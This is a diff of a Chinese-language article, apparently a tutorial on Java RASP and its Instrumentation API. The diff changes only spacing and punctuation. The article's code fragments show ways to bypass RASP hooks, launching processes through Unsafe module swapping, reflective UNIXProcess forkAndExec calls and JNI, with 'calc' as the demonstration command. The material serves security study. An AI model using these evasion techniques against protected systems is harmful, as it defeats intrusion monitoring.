@@ -106,7 +106,7 @@ public class Test {
         Module baseModule=Object.class.getModule();
         Class<?> currentClass= Test.class;
         long addr=unSafeClass.objectFieldOffset(Class.class.getDeclaredField("module"));
-        unSafeClass.getAndSetObject(currentClass,addr,baseModule); //更改当前运行类的Module
+        unSafeClass.getAndSetObject(currentClass,addr,baseModule); //更改当前运行类的 Module
         Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
         defineClass.setAccessible(true);
         Class<?> calc= (Class<?>) defineClass.invoke(ClassLoader.getSystemClassLoader(), "attack", decode, 0, decode.length);
@@ -130,7 +130,7 @@ Instrumentation API 提供了两个核心接口：`ClassFileTransformer` 和 `In
 1.  `premain` 方法：`premain` 方法是在 Java 虚拟机启动时，在被代理的应用程序加载之前运行的。我们可以在 Agent 中的 `premain` 方法中执行一些初始化操作，并在应用程序启动之前对目标类进行修改。
 2.  `agentmain` 方法：`agentmain` 方法是在 Java 虚拟机已经启动并且应用程序正在运行时，动态地加载一个 Java Agent。通过使用 `attach API`，我们可以将 Agent 动态地附加到正在运行的 Java 进程上。这样，我们可以在应用程序运行期间对目标类进行修改。
 
-例子:
+例子：
 
 `Agent` 类：
 
@@ -287,7 +287,7 @@ public class RaspTransformer implements ClassFileTransformer {
 
 ## UNIXProcess
 
-至于如何实例化一个 `UNIXProcess`，可以从 `ProcessImpl` 中看出来，以下是这个类的源码:
+至于如何实例化一个 `UNIXProcess`，可以从 `ProcessImpl` 中看出来，以下是这个类的源码：
 
 ```plain
 final class ProcessImpl {
@@ -519,14 +519,14 @@ final class ProcessImpl {
     if (strs != null) {
         Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
         theUnsafeField.setAccessible(true);
-        Unsafe unsafe = (Unsafe) theUnsafeField.get(null); //通过get方法得到unsafe对象
+        Unsafe unsafe = (Unsafe) theUnsafeField.get(null); //通过 get 方法得到 unsafe 对象
         Class processClass = null;
         try {
             processClass = Class.forName("java.lang.UNIXProcess");
         } catch (ClassNotFoundException e) {
             processClass = Class.forName("java.lang.ProcessImpl");
         }
-        Object processObject = unsafe.allocateInstance(processClass);//创建UNIXProcess对象
+        Object processObject = unsafe.allocateInstance(processClass);//创建 UNIXProcess 对象
         //原代码
         byte[][] args = new byte[strs.length - 1][];
         int      size = args.length; 
@@ -542,16 +542,16 @@ final class ProcessImpl {
         }
         int[] envc                 = new int[1];
         int[] std_fds              = new int[]{-1, -1, -1};
-        //构造forkAndExec需要的参数
+        //构造 forkAndExec 需要的参数
         Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
         Field helperpathField      = processClass.getDeclaredField("helperpath");
         launchMechanismField.setAccessible(true);
         helperpathField.setAccessible(true);
-        //从UNIXProcess中得到launchMechanism和Helperpath
+        //从 UNIXProcess 中得到 launchMechanism 和 Helperpath
         Object launchMechanismObject = launchMechanismField.get(processObject);
         byte[] helperpathObject      = (byte[]) helperpathField.get(processObject);
         int ordinal = (int) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);
-       //反射forkAndExec方法
+       //反射 forkAndExec 方法
         Method forkMethod = processClass.getDeclaredMethod("forkAndExec", new Class[]{
                 int.class, byte[].class, byte[].class, byte[].class, int.class,
                 byte[].class, int.class, byte[].class, int[].class, boolean.class
@@ -656,7 +656,7 @@ gcc -I "C:\Program Files\Java\jdk-17.0.2\include" -I "C:\Program Files\Java\jdk-
 
 ```plain
 public static void main(String[] args) {
-        System.loadLibrary("jni"); //load()指定绝对路径
+        System.loadLibrary("jni"); //load() 指定绝对路径
         Command command = new Command();
         String ipconfig = command.exec("calc");
         System.out.println(ipconfig);
